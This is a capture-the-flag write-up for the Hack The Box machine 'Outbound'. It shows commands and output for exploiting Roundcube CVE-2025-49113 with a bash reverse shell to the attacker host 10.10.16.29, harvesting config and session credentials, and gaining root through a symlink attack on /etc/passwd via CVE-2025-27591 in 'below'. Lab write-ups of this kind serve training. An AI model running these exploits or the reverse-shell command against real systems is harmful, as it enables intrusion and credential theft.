# Title : Outbound

## Enumeration

### Port Scanning

```bash

$ nmap -sV -sC -Pn -A 10.10.11.77                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 14:51 WAT
Nmap scan report for 10.10.11.77
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   447.35 ms 10.10.16.1
2   243.96 ms 10.10.11.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.47 seconds


```

- i add `http://mail.outbound.htb/` to `/etc/hosts`

```bash

echo "10.10.11.77     mail.outbound.htb" >> /etc/hosts

```

- I found it was using `Roundcube Webmail`

- the username & password was provide

```bash

Machine Information

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2

```

### Initial Access

```bash

login with username and password  

tyler / LhKL1o9Nm3X2

```

- findings

```bash

Roundcube Webmail 1.6.10
Copyright © 2005-2025, The Roundcube Dev Team

This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
Some exceptions for skins & plugins apply.

Installed plugins
Plugin	Version	License	Source
archive	3.5	GPL-3.0+	
filesystem_attachments	1.0	GPL-3.0+	
jqueryui	1.13.2	GPL-3.0+	
zipdownload	3.4	GPL-3.0+	


```

- make a research i find it was vulnerable  with cve of `CVE-2025-49113`

- use this exploit `https://github.com/hakaioffsec/CVE-2025-49113-exploit` to exploit it

```bash

$ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
Cloning into 'CVE-2025-49113-exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 1), reused 9 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 442.35 KiB | 112.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.

$ cd CVE-2025-49113-exploit/ 

```

- when i read the readme i find the documentation how to use the exploit

```bash

$ php  CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.29/4444 0>&1'"    
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...


```

- i start the my listener on port 4444

```bash

$ nc -lvnp 4444                                            
listening on [any] 4444 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.11.77] 52210
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ 


```
- the  reverse shell was Caught as www-date
- switch user to tyler

```bash

www-data@mail:/$ su tyler
su tyler
Password: LhKL1o9Nm3X2

whoami
tyler


```

- navigate to the directory where the application was hosted  `/var/www/html/roundcube` 

- i saw the config drectory

```bash

tyler@mail:/var/www/html/roundcube$ cd config
cd config
tyler@mail:/var/www/html/roundcube/config$ ls
ls
config.inc.php
config.inc.php.sample
defaults.inc.php
mimetypes.php
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
cat config.inc.php

<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
tyler@mail:/var/www/html/roundcube/config$ 
tyler@mail:/var/www/html/roundcube/config$ 



```

- summaarry

```bash

// Database connection string
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
// Encryption key for session data
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

```
- connect to the database, i enumerate it

```bash

mysql -u roundcube -pRCDBPass2025 -h localhost roundcube


```

- i Analysis jacob session data
- After base64 decoding the session data, found:

```
username|s:5:"jacob";
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";

```

- after i decrypt `Decrypted password: 595mO8DmwGeD`

- switch user to jacob 

```bash 

tyler@mail:/$ su jacob
su jacob
Password: 595mO8DmwGeD
id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
bash -i
bash: cannot set terminal process group (256): Inappropriate ioctl for device
bash: no job control in this shell
jacob@mail:/$ 


```

- i

```bash 

jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler



```

- a password `gY4Wr3a1evp4` which was send to `jacob` from `tyler` i use it to login into ssh 

```bash

ssh jacob@10.10.11.77
jacob@10.10.11.77's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jul 27 04:00:02 PM UTC 2025

  System load:  0.16              Processes:             275
  Usage of /:   74.6% of 6.73GB   Users logged in:       1
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul 27 15:32:21 2025 from 10.10.14.120
jacob@outbound:~$ 

```

- to get the user flag 

```bash

jacob@outbound:~$ ls
fakepass  user.txt
jacob@outbound:~$ cat user.txt 
313762ebb0c8253b9d3edc95e5251b59


```

- to get the root password we have to escalate our priviledge

```bash

jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```

```bash

jacob@outbound:~$ sudo  /usr/bin/below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help


```

- I found it was vulnerable with cve of CVE-2025-27591

- use https://github.com/BridgerAlderson/CVE-2025-27591-PoC 


```bash

git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC.git
Cloning into 'CVE-2025-27591-PoC'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 39 (delta 11), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (39/39), 14.01 KiB | 130.00 KiB/s, done.
Resolving deltas: 100% (11/11), done.

$ cd CVE-2025-27591-PoC

$ python3 -m http.server 

```

- on the target machine

```bash

jacob@outbound:~$ wget 10.10.16.29:8000/exploit.py
--2025-07-27 16:11:05--  http://10.10.16.29:8000/exploit.py
Connecting to 10.10.16.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3255 (3.2K) [text/x-python]
Saving to: ‘exploit.py’

exploit.py                100%[=====================================>]   3.18K  --.-KB/s    in 0.1s    

2025-07-27 16:11:06 (25.5 KB/s) - ‘exploit.py’ saved [3255/3255]


```

- then i run the script


```bash

jacob@outbound:~$ python3 exploit.py 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Jul 27 16:11:26.831 DEBG Starting up!
Jul 27 16:11:26.832 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01753574400: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/home/jacob# ls
exploit.py  fakepass  user.txt
root@outbound:/home/jacob# cd /root
root@outbound:~# ls
root.txt
root@outbound:~# cat root.txt 
84421ae10ff9050031ad698070af49c7
root@outbound:~# 



```
